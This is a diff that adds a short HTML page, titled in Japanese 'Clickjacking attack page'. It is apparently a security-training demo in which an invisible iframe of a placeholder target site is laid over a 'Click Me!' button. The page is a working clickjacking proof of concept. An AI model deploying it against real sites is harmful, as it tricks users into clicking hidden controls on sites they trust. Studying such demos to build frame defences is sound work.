@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>クリックジャッキング攻撃ページ</title>
+    <style>
+      #frm {
+        opacity: 0;
+        position: absolute;
+        z-index: 1;
+        top: 0;
+        left: 0;
+      }
+    </style>
+  </head>
+  <body>
+    <button>Click Me!</button>
+    <iframe
+      id="frm"
+      src="http://site.example:3000/clickjacking_target.html"
+    ></iframe>
+  </body>
+</html>
